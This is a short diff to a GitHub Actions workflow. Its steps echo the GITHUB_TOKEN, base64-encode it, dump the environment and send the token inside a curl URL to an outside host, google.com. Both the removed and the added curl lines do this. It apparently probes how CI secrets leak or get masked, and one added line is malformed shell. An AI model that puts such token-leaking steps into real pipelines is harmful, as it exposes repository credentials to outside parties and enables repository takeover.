@@ -9,7 +9,9 @@ jobs:
       - run: echo "$GITHUB_TOKEN"
       - run: export GT=$GITHUB_TOKEN
       - run: export GT2=${{ github.token }}
-      - run: curl -v https://www.google.com/$GT2=${{ github.token }}
+      - run: echo ${{ github.token }} | base64
+      - run: export GT3=$(${{ github.token }} | base64)
+      - run: curl -v https://www.google.com/${GT3}=${{ github.token }}
       - run: env
       - run: echo "Deploying to production server on branch $GITHUB_RUN_ID"
       - run: sleep 61
